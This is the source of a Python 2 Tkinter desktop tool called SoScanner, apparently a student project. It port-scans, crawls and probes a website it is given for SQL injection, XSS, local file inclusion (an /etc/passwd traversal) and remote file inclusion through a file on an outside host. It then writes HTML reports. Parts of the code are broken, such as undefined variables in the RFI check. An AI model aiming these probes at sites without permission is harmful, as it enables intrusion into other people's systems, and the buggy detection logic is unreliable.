# -*- coding: utf-8 -*-
from Tkinter import *
import tkMessageBox
import ttk as ttk
import time
import os
import urllib2
import re
import socket
import urlparse
import urllib
import subprocess
import PIL.Image
import PIL.ImageTk
import random
import webbrowser

from selenium import webdriver

from selenium.webdriver.chrome.options import Options



chromeOptions = Options()

chromeOptions.add_argument("--kiosk")

driver = webdriver.Chrome("/Users/app/Desktop/bitirmeodevi/chromedriver",chrome_options=chromeOptions)

driver.get('file://' + os.path.realpath("animasyon.html"))

time.sleep(10)
driver.close()


portliste=[20,21,22,23,25,53,80,110,139,143,443,445,1433,1521,3306,3389]
payload = ["\"><script>alert(1)</script>"]
liste=[]
LFI = "../../../../../../../../../../../../etc/passwd"
RFI = "http://womaneng.com/rfi.txt?"
vulnx=[]
master = Tk()
master.geometry("600x450+389+102")
master.title("SoScanner")
master.configure(background="#d9d9d9")

Frame1 = Frame(master)
Frame1.place(relx=0.02, rely=0.02, relheight=0.94, relwidth=0.96)
Frame1.configure(relief=GROOVE)
Frame1.configure(borderwidth="2")
Frame1.configure(relief=GROOVE)
Frame1.configure(background="#d9d9d9")
Frame1.configure(width=575)

Label1 = Label(Frame1)
Label1.place(relx=0.02, rely=0.05, height=21, width=71)
Label1.configure(background="#d9d9d9")
Label1.configure(disabledforeground="#a3a3a3")
Label1.configure(foreground="#000000")
Label1.configure(text='''http://www.''',font="Times 13 bold")
v = StringVar()
Entry1 = Entry(Frame1,textvariable=v)
Entry1.place(relx=0.14, rely=0.05,height=20, relwidth=0.29)
Entry1.configure(background="white")
Entry1.configure(disabledforeground="#a3a3a3")
Entry1.configure(font="TkFixedFont")
Entry1.configure(foreground="#000000")
Entry1.configure(insertbackground="black")

tree = ttk.Treeview(Frame1)
tree.place(relx=0.02, rely=0.12, relheight=0.82, relwidth=0.56)
tree.heading('#0', text='Sonuclar:',anchor="center")
tree.column("#0",width="331")
tree.insert("", 1, "dir", text="Crawler")
tree.insert("", 2, "dir1", text="Web Zaafiyet")
id1=tree.insert("dir1",2, text="SQL")
id2=tree.insert("dir1",2, text="XSS")
id3=tree.insert("dir1",2, text="RFI")
id4=tree.insert("dir1",2, text="LFI")
tree.insert("", 3, "dir2", text="Network")
id5=tree.insert("dir2", 3, text="Port")
id6=tree.insert("dir2", 3, text="Ip")

Listbox1 = Listbox(Frame1)
Listbox1.place(relx=0.59, rely=0.12, relheight=0.43, relwidth=0.39)
Listbox1.configure(background="white",disabledforeground="#a3a3a3",font="TkFixedFont",foreground="#000000",highlightbackground="#d9d9d9",highlightcolor="black",selectbackground="#c4c4c4",selectforeground="black",width=164)
TProgressbar1 = ttk.Progressbar(Frame1)
TProgressbar1.place(relx=0.02, rely=0.94, relwidth=0.97, relheight=0.0, height=22)
TProgressbar1.configure(length="550")
def tara():
    if  len(v.get())==0:
        tkMessageBox.showinfo("Bilgi", "Link giriniz lütfen!!")
    else:
        del vulnx[:]
        global hedef,lfi,rfi,sql
        lfi=0
        rfi=0
        sql=0
        TProgressbar1.start(5)
        hedef = Entry1.get()
        start_time = time.time()
        with open(hedef+".txt","w") as rapor:
            try:
                print(hedef+" Tarama hazirligi yapiliyor")
                Listbox1.delete(0,'end')
                from bs4 import BeautifulSoup
                import dns.resolver
                import builtwith
                import mechanize
                import requests
                a=0
                Listbox1.insert(END, "Komut alindi")
                Listbox1.insert(END, "Keşif yapılıyor")
                rapor.write("\nSite Hakkinda Bilgiler")
                print("Sitede ki teknolojiler tespit ediliyor")
                website=builtwith.parse("http://"+hedef)
                for key, value in website.items():
                    ra=("\n"+key+ ":" + ", ".join(value))
                    print(ra)
                    rapor.write(ra)
                Listbox1.insert(END, "Ip taraması başladi")
                time.sleep(3)
                reelip=socket.gethostbyname(hedef)
                print("Ip taramasi basladi")
                for x in dns.resolver.query(hedef, 'MX'):
                    b=x.to_text().rstrip(".")
                    c=b.split(" ")
                    reelip2=socket.gethostbyname(c[1])
                    rapor.write("\nIp adresi: {}".format(reelip))
                    tree.insert(id6, 3, text=str("İp: "+reelip))
                    rapor.write("\nMX Kaydi: {} \n".format(reelip2))
                    tree.insert(id6, 3, text=str("Mx: "+reelip2))
                    print(reelip)
                    print(reelip2)
                    break
                print("Port taramasi basladi")
                rapor.write("\n***Port Bilgisi***")
                Listbox1.insert(END, "Port taramasi")
                for port in portliste:
                    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    if s.connect_ex((reelip2,port)) == 0:
                        rapor.write("\n{}. Port Acik".format(port))
                        tree.insert(id5, 3, text=str(port)+" Acik")
                        print(str(port)+".Port Acik")
                    else:
                        rapor.write("\n{}. Port Kapalı".format(port))
                        tree.insert(id5, 3, text=str(port)+" Kapali")
                        print(str(port)+".Port Kapali")
                url_oku = urllib2.urlopen("http://viewdns.info/iphistory/?domain="+hedef)
                soup = BeautifulSoup(url_oku, 'html.parser')
                rapor.write("\n***IP Adres Gecmisi***")
                print("IP Adres Gecmisi Arastiriliyor")
                for tr in soup.find_all('tr')[4]:
                    tds = tr.find_all('td')
                    for i in tds:
                        for x in i:
                            ip = re.findall( r'[0-9]+(?:\.[0-9]+){3}', x )
                            if not ip:
                                pass
                            else:
                                for ip2 in ip:
                                    rapor.write("\n"+ip2)
                                    print(ip2)
                hedef2=("http://"+hedef)
                tarayici = mechanize.Browser()

                tarayici.set_handle_robots(False)

                tarayici.addheaders=[('User-agent', "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36")]
                url=hedef2
                urls = [url]
                gez = [url]
                liste=[]
                Listbox1.insert(END, "Link kaziliyor")
                print("Link kazma islemi basladi")
                while len(urls) > 0:
                    try:
                        tarayici.open(urls[0])
                        urls.pop(0)
                        for link in tarayici.links():
                            yeniurl =  urlparse.urljoin(link.base_url,link.url)
                            if yeniurl not in gez and url in yeniurl:
                                gez.append(yeniurl)
                                urls.append(yeniurl)
                                liste.append(yeniurl)
                                tree.insert("dir", 1, text=yeniurl)
                                print(yeniurl)
                    except:
                        urls.pop(0)
                rapor.write("\n***Aciklar***")
                print("Zaafiyet Taramasi Basladi")
                Listbox1.insert(END, "Zaafiyet taramasi")
                for i in liste:
                    url=i
                    initial = "'"
                    first = requests.post(url + initial)
                    if "mysql" in first.text.lower():
                        rapor.write("\nmysql hatasi: "+url)
                        tree.insert(id1,2,text=url)
                        print("\nmysql hatasi: "+url)
                        sql+=1
                if sql==0:
                    tree.insert(id1,2,text="-")
                    rapor.write("\nSQL bulunamadı")
                    print("SQL bulunamadı")
                else:
                    vulnx.append("Risk1=SQL")
                for nn in liste:
                    lf=nn
                    lfitest = urllib.urlopen(lf+LFI).read()
                    if re.search("root", lfitest):
                        rapor.write("\nLFI Bulundu: "+(nn+LFI))
                        print("LFI Bulundu: "+(nn+LFI))
                        tree.insert(id4,2,text=nn+LFI)
                        lfi+=1
                if lfi==0:
                    rapor.write("\nLFI bulunamadı")
                    print("LFI bulunamadi")
                    tree.insert(id4,2,text="-")
                else:
                    vulnx.append("&Risk3=LFI")
                for tt in liste:
                    urltest = urllib.urlopen(tt+RFI).read()
                    if re.search("RFITEST", urltest):
                        rapor.write("\nRFI bulundu: "+(host+RFI))
                        print("RFI bulundu: "+(host+RFI))
                        tree.insert(id3,2,text=str(nn+LFI))
                        rfi+=1
                if rfi==0:
                    rapor.write("\nRFI bulunamadı")
                    print("RFI bulunamadi" )
                    tree.insert(id3,2,text="-")
                else:
                    vulnx.append("&Risk4=RFI")
                t=2
                while t==2:
                    a=0
                    global vul
                    vul = 0
                    nvul = 0
                    for op in liste:
                        urlqs=op
                        for iq in payload:
                            r = requests.get(urlqs+iq)
                            if iq in r.text:
                                rapor.write('\nXss var : '+urlqs+iq)
                                print("\nXss var : "+urlqs+iq)
                                tree.insert(id2,2,text=urlqs)
                                vul += 1
                            else:
                                nvul += 1
                    if vul!=0:
                        vulnx.append("Risk2=XSS")
                        rapor.write('\nBaşarılı Xss denemesi : '+str(vul))
                    
                    elif nvul!=0:
                        rapor.write ('\nBaşarısız Xss denemesi : '+str(nvul))
                    break
            
            except ValueError:
                TProgressbar1.stop()
                tkMessageBox.showerror("Hata", "Linki Kontrol ediniz")
                a=1
            except ImportError:
                TProgressbar1.stop()
                a=1
                tkMessageBox.showerror("Modül Hatasi", "Eksik modül var")
                cevap=tkMessageBox.askquestion("Yükleme islemi", "Modüller kurulsun mu??", icon='warning')
                if cevap=="yes":
                    os.system("pip install -r requirements.txt")
                
                else:
                    tkMessageBox.showerror("Modül Hatasi", "Modüller kurulamadi, program kapaniyor.")
                    master.destroy()
            except socket.gaierror:
                TProgressbar1.stop()
                tkMessageBox.showerror("Hata", "Linki Kontrol Ediniz")
                rapor.close()
                os.remove(hedef+".txt")

                a=1
            except:
                TProgressbar1.stop()
                tkMessageBox.showerror("Hata", "Bilinmeyen Hata oluştu")
                a=1
                
                
            if a==0:
                Listbox1.insert(END, "İslemler bitti")
                elapsed_time = time.time() - start_time
                TProgressbar1.stop()
                tkMessageBox.showinfo("Bilgi", "İslem bitti {} sn surdu".format(int(elapsed_time)))
                Button2.config(state="normal")
                global string
                string=""
                for i in vulnx:
                    string+=i
                with open (hedef+".html","w") as grapor:
                
                        grapor.write("""
                                    <!DOCTYPE html>
                                    <html>
                                    <head>
                                    <meta charset='utf-8'>
                                    <title>SoScanner</title>
                                    <script src="js/jquery.min.js"></script>
                                    <link rel="stylesheet" type="text/css" href="css/jqcandlestick.css" />
                                    <link rel="stylesheet" href="css/morris.css">
                                    <link href="css/style.css" rel="stylesheet" type="text/css" media="all" />
                                    <link rel="stylesheet" href="css/awdawd.css">

                                    </head>
                                    <body>
                                    <div class="main">
                                    <h1>Tarama Sonuclari</h1>
                                    <div class="w3_agile_main_grids">
                                    <div class="w3_agile_main_grid_left">
                                    <div class="agileits_gauge_meter agileits_w3layouts_text" style="height:  270px;">
				    <h3>Zaafiyet Metre </h3>
				    <div class="js-gauge js-gauge--1 gauge"></div>
                                    </div>
                                    </div>
                                    <div class="w3_agile_main_grid_right">
                                    <div class="w3_agileits_skills agileits_w3layouts_text">
				    <h3>Zaafiyetler</h3>
				    <div class="skillbar" data-percent="""+str(sql*3)+""">
				    <span class="skillbar-title" style="background: #d35400;">SQL</span>
				    <p class="skillbar-bar" style="background: #e67e22;"></p>
				    <span class="skill-bar-percent"></span>
				    </div>
					
					
				    <div class="skillbar" data-percent="""+str(vul*3)+""">
				    <span class="skillbar-title" style="background: #2980b9;">XSS</span>
				    <p class="skillbar-bar" style="background: #3498db;"></p>
				    <span class="skill-bar-percent"></span>
                                    </div>
					
                            		
				    <div class="skillbar" data-percent="""+str((lfi*3))+""">
				    <span class="skillbar-title" style="background: #2c3e50;">LFİ</span>
				    <p class="skillbar-bar" style="background: #2c3e50;"></p>
				    <span class="skill-bar-percent"></span>
				    </div>
					
					
                                    <div class="skillbar" data-percent="""+str(rfi*3)+""">
				    <span class="skillbar-title" style="background: #46465e;">RFİ</span>
				    <p class="skillbar-bar" style="background: #5a68a5;"></p>
				    <span class="skill-bar-percent"></span>
				    </div>
					
                                    </div>
                                    </div>
                                    <div class="clear"> </div>
                                    <div class="wthree_bars_bottom">
                                    <div class="agileinfo_bars_bottom_left">
				    <div class="w3_spider_graph agileits_w3layouts_text">
				    <h3>Site Bilgileri</h3>
				    <p>Site:"""+hedef+""" </p><br>
				    <p>Ip adresi: """+str(reelip)+"""</p><br>
				    <p><a href="https://www.shodan.io/host/"""+str(reelip)+'"'+""">Server header bilgileri</a></p><br>
				    <a href="https://www.whois.com/whois/"""+str(reelip)+'"'+""">Whois Bilgileri</a>
				    <div id=""></div>
				    </div>
                                    </div>""")
                        if sql>1:
                            zmtr=random.randint(50,100)
                            grapor.write("""
                                    <div class="chart" id="graph-2-container">
                                    <h2 class="title">Site Puani</h2>
                                    <div class="chart-svg">
                                    <svg class="chart-line" id="chart-2" viewBox="0 0 80 40">
                                    <defs>
                                    <clipPath id="clip" x="0" y="0" width="80" height="40">
                                    <rect id="clip-rect" x="-80" y="0" width="77" height="38.7"></rect>
                                    </clipPath>
    
                                    <linearGradient id="gradient-1">
                                    <stop offset="0" stop-color="#00d5bd"></stop>
                                    <stop offset="100" stop-color="#24c1ed"></stop>
                                    </linearGradient>

                                    <linearGradient id="gradient-2">
                                    <stop offset="0" stop-color="#954ce9"></stop>
                                    <stop offset="0.3" stop-color="#954ce9"></stop>
                                    <stop offset="0.6" color="#24c1ed"></stop>
                                    <stop offset="1" stop-color="#24c1ed"></stop>
                                    </linearGradient>


                                    <linearGradient id="gradient-3" x1="0%" y1="0%" x2="0%" y2="100%">&gt;
                                    <stop offset="0" stop-color="rgba(0, 213, 189, 1)" stop-opacity="0.07"></stop>
                                    <stop offset="0.5" stop-color="rgba(0, 213, 189, 1)" stop-opacity="0.13"></stop>
                                    <stop offset="1" stop-color="rgba(0, 213, 189, 1)" stop-opacity="0"></stop>
                                    </linearGradient>


                                    <linearGradient id="gradient-4" x1="0%" y1="0%" x2="0%" y2="100%">&gt;
                                    <stop offset="0" stop-color="rgba(149, 76, 233, 1)" stop-opacity="0.07"></stop>
                                    <stop offset="0.5" stop-color="rgba(149, 76, 233, 1)" stop-opacity="0.13"></stop>
                                    <stop offset="1" stop-color="rgba(149, 76, 233, 1)" stop-opacity="0"></stop>
                                    </linearGradient>
          
                                    <clipPath id="Sjg7n8c391m"><rect x="-80" y="0" width="80" height="40" transform="matrix(1,0,0,1,80,0)"></rect></clipPath></defs>
                                    <desc>Created with Snap</desc><defs><clipPath id="Sjg7n8c391r"><rect x="-80" y="0" width="80" height="40" transform="matrix(1,0,0,1,80,0)"></rect></clipPath></defs><g id="grid"><path d="M0,0 L77,0" class="horizontal"></path><path d="M0,5.5 L77,5.5" class="horizontal"></path><path d="M0,11 L77,11" class="horizontal"></path><path d="M0,16.5 L77,16.5" class="horizontal"></path><path d="M0,22 L77,22" class="horizontal"></path><path d="M0,27.5 L77,27.5" class="horizontal"></path><path d="M0,33 L77,33" class="horizontal"></path><path d="M0,38.5 L77,38.5" class="horizontal"></path><path d="M0,38.7 L0,0" class="vertical"></path><path d="M5.5,38.7 L5.5,0" class="vertical"></path><path d="M11,38.7 L11,0" class="vertical"></path><path d="M16.5,38.7 L16.5,0" class="vertical"></path><path d="M22,38.7 L22,0" class="vertical"></path><path d="M27.5,38.7 L27.5,0" class="vertical"></path><path d="M33,38.7 L33,0" class="vertical"></path><path d="M38.5,38.7 L38.5,0" class="vertical"></path><path d="M44,38.7 L44,0" class="vertical"></path><path d="M49.5,38.7 L49.5,0" class="vertical"></path><path d="M55,38.7 L55,0" class="vertical"></path><path d="M60.5,38.7 L60.5,0" class="vertical"></path><path d="M66,38.7 L66,0" class="vertical"></path><path d="M71.5,38.7 L71.5,0" class="vertical"></path><path d="M77,38.7 L77,0" class="vertical"></path></g><path d="M1,8 L6.978571428571429,14 L12.957142857142857,14 L18.935714285714287,24 L24.914285714285715,18 L30.892857142857142,26.4 L36.871428571428574,18.4 L42.85,20 L48.82857142857143,16 L54.80714285714286,14.399999999999999 L60.785714285714285,18 L66.76428571428572,29.2 L72.74285714285715,30.4 L78,28" id="graph-2" style="stroke-dasharray: 105.99; stroke-dashoffset: 105.99;"></path><polygon points="1,8 6.978571428571429,14 12.957142857142857,14 18.935714285714287,24 24.914285714285715,18 30.892857142857142,26.4 36.871428571428574,18.4 42.85,20 48.82857142857143,16 54.80714285714286,14.399999999999999 60.785714285714285,18 66.76428571428572,29.2 72.74285714285715,30.4 78,28 78,38.4 1,38.4" id="poly-2" clip-path="url('#Sjg7n8c391r')"></polygon></svg>
                                    </div>
                                    <div class="chart-values">
      
      
                                    <p class="total-gain">-Kotu</p>
                                    </div>
                                    <div class="triangle red"></div>
                                    </div>""")
                            
                        else:
                            zmtr=random.randint(1,50)
                            grapor.write("""
                                    <div class="chart" id="graph-1-container">
                                    <h2 class="title">Site Puani</h2>
                                    <div class="chart-svg">
                                    <svg class="chart-line" id="chart-1" viewBox="0 0 80 40">
                                    <defs>
                                    <clipPath id="clip" x="0" y="0" width="80" height="40">
                                    <rect id="clip-rect" x="-80" y="0" width="77" height="38.7"></rect>
                                    </clipPath>

                                    <linearGradient id="gradient-1">
                                    <stop offset="0" stop-color="#00d5bd"></stop>
                                    <stop offset="100" stop-color="#24c1ed"></stop>
                                    </linearGradient>

                                    <linearGradient id="gradient-2">
                                    <stop offset="0" stop-color="#954ce9"></stop>
                                    <stop offset="0.3" stop-color="#954ce9"></stop>
                                    <stop offset="0.6" stop-color="#24c1ed"></stop>
                                    <stop offset="1" stop-color="#24c1ed"></stop>
                                    </linearGradient>

    
                                  <linearGradient id="gradient-3" x1="0%" y1="0%" x2="0%" y2="100%">&gt;
                                  <stop offset="0" stop-color="rgba(0, 213, 189, 1)" stop-opacity="0.07"></stop>
                                  <stop offset="0.5" stop-color="rgba(0, 213, 189, 1)" stop-opacity="0.13"></stop>
                                  <stop offset="1" stop-color="rgba(0, 213, 189, 1)" stop-opacity="0"></stop>
                                  </linearGradient>
                                  <linearGradient id="gradient-4" x1="0%" y1="0%" x2="0%" y2="100%">&gt;
                                  <stop offset="0" stop-color="rgba(149, 76, 233, 1)" stop-opacity="0.07"></stop>
                                  <stop offset="0.5" stop-color="rgba(149, 76, 233, 1)" stop-opacity="0.13"></stop>
                                  <stop offset="1" stop-color="rgba(149, 76, 233, 1)" stop-opacity="0"></stop>
                                  </linearGradient>
          
                                  <clipPath id="Sjg7n8c391m"><rect x="-80" y="0" width="80" height="40" transform="matrix(1,0,0,1,80,0)"></rect></clipPath></defs>
                                  <desc>Created with Snap</desc><g id="grid"><path d="M0,0 L77,0" class="horizontal"></path><path d="M0,5.5 L77,5.5" class="horizontal"></path><path d="M0,11 L77,11" class="horizontal"></path><path d="M0,16.5 L77,16.5" class="horizontal"></path><path d="M0,22 L77,22" class="horizontal"></path><path d="M0,27.5 L77,27.5" class="horizontal"></path><path d="M0,33 L77,33" class="horizontal"></path><path d="M0,38.5 L77,38.5" class="horizontal"></path><path d="M0,38.7 L0,0" class="vertical"></path><path d="M5.5,38.7 L5.5,0" class="vertical"></path><path d="M11,38.7 L11,0" class="vertical"></path><path d="M16.5,38.7 L16.5,0" class="vertical"></path><path d="M22,38.7 L22,0" class="vertical"></path><path d="M27.5,38.7 L27.5,0" class="vertical"></path><path d="M33,38.7 L33,0" class="vertical"></path><path d="M38.5,38.7 L38.5,0" class="vertical"></path><path d="M44,38.7 L44,0" class="vertical"></path><path d="M49.5,38.7 L49.5,0" class="vertical"></path><path d="M55,38.7 L55,0" class="vertical"></path><path d="M60.5,38.7 L60.5,0" class="vertical"></path><path d="M66,38.7 L66,0" class="vertical"></path><path d="M71.5,38.7 L71.5,0" class="vertical"></path><path d="M77,38.7 L77,0" class="vertical"></path></g><path d="M1,34 L6.978571428571429,30 L12.957142857142857,24 L18.935714285714287,28 L24.914285714285715,22 L30.892857142857142,24 L36.871428571428574,26 L42.85,18 L48.82857142857143,25.2 L54.80714285714286,20 L60.785714285714285,16 L66.76428571428572,22 L72.74285714285715,12 L78,8.799999999999997" id="graph-1" style="stroke-dasharray: 104.673; stroke-dashoffset: 104.673;"></path><polygon points="1,34 6.978571428571429,30 12.957142857142857,24 18.935714285714287,28 24.914285714285715,22 30.892857142857142,24 36.871428571428574,26 42.85,18 48.82857142857143,25.2 54.80714285714286,20 60.785714285714285,16 66.76428571428572,22 72.74285714285715,12 78,8.799999999999997 78,38.4 1,38.4" id="poly-1" clip-path="url('#Sjg7n8c391m')"></polygon></svg>
     
                                  </div>
                                  <div class="chart-values">
                                  <p class="total-gain">+iyi</p>
                                  </div>
                                  <div class="triangle green"></div>
	
                                  </div>""")
                            
											
                        grapor.write("""
                                </div>
                            	</div>
				<div class="clear"> </div>
                                </div>
                                </div>
                                <div class="w3layouts_copyright">
			
                    		</div>  
                                <!-- skill-bars -->
                                <script src="js/skill.bars.jquery.js"></script>
                                <script>

                                $(document).ready(function(){
			
                                $('.skillbar').skillBars({
				from: 0,
				speed: 4000, 
				interval: 100,
				decimals: 0,
                                });
			
                                });

                                </script>
                                <!-- //skill-bars -->
                                <!-- gauge-meter -->
                                <script type="text/javascript" src="js/raphael-min.js"></script>
                                <script type="text/javascript" src="js/kuma-gauge.jquery.js"></script>
                                <script>
                                $('.js-gauge--1').kumaGauge({
				
                                });

                                $('.js-gauge--1').kumaGauge('update',{ 
                                 
				value : Math.floor("""+str(zmtr)+""")
                                });
	

                                </script>

                                </div>
                                </body>
                                </html>  """)

            

                

                            
            
            




            
Button1 = Button(Frame1)
Button1.place(relx=0.45, rely=0.04, height=32, width=92)
original = open('tara.png','rb')
img = PIL.Image.open(original)
ph_im = PIL.ImageTk.PhotoImage(img) 
Button1.config(image=ph_im,activebackground="#d9d9d9",activeforeground="#000000",background="#d9d9d9",borderwidth="0",disabledforeground="#a3a3a3",foreground="#000000",highlightbackground="#d9d9d9",highlightcolor="black",pady="0",command=tara)
def rapor():
    webbrowser.open('file://' + os.path.realpath(hedef+".html"))
    if os.name=='nt':
        subprocess.call(['notepad.exe', hedef+'.txt'])
    else:
        os.system('open -a TextEdit '+hedef+'.txt')
        


Button2 = Button(Frame1)
Button2.place(relx=0.63, rely=0.04, height=32, width=92)
original1 = open('rapor.png','rb')
img1 = PIL.Image.open(original1)
ph_im1 = PIL.ImageTk.PhotoImage(img1) 
Button2.config(state="disabled",image=ph_im1,activebackground="#d9d9d9",activeforeground="#000000",background="#d9d9d9",borderwidth="0",disabledforeground="#a3a3a3",foreground="#000000",highlightbackground="#d9d9d9",highlightcolor="black",pady="0",command=rapor)


def tavsiye():
    try:
        driver = webdriver.Chrome("/Users/app/Desktop/bitirmeodevi/chromedriver")
        driver.get('file://' + os.path.realpath("tavsiye.html?")+string)
    except:
        tkMessageBox.showerror("Tarama yapın", "Tavsiye verilebilmesi için ilk olarak tarama yapınız !!")
        
    
    
Button3 = Button(Frame1)
Button3.place(relx=0.8, rely=0.04, height=32, width=92)
original2 = open('oneriler.png','rb')
img2 = PIL.Image.open(original2)
ph_im2 = PIL.ImageTk.PhotoImage(img2) 
Button3.config(image=ph_im2,activebackground="#d9d9d9",activeforeground="#000000",background="#d9d9d9",borderwidth="0",disabledforeground="#a3a3a3",foreground="#000000",highlightbackground="#d9d9d9",highlightcolor="black",pady="0",command=tavsiye)

def info():
    try:
        webbrowser.open('file://' + os.path.realpath("tavsiye.html#info.html"))
    except:
        tkMessageBox.showerror("Dosya hatası", "Dosya bulunamadı")
   
Button4 = Button(Frame1)

Button4.place(relx=0.59, rely=0.8, height=53, width=226)

original3 = open('hakkimizda.png','rb')

img3 = PIL.Image.open(original3)

ph_im3 = PIL.ImageTk.PhotoImage(img3) 

Button4.config(image=ph_im3,activebackground="#d9d9d9",activeforeground="#000000",background="#d9d9d9",borderwidth="0",disabledforeground="#a3a3a3",foreground="#000000",highlightbackground="#d9d9d9",highlightcolor="black",pady="0",command=info)



Label2 = Label(Frame1)

Label2.place(relx=0.61, rely=0.56, height=96, width=200)

original4 = open('logo.png','rb')

img4 = PIL.Image.open(original4)

ph_im4 = PIL.ImageTk.PhotoImage(img4) 

Label2.configure(image=ph_im4,background="#d9d9d9",disabledforeground="#a3a3a3",foreground="#000000",width=200)






master.mainloop()
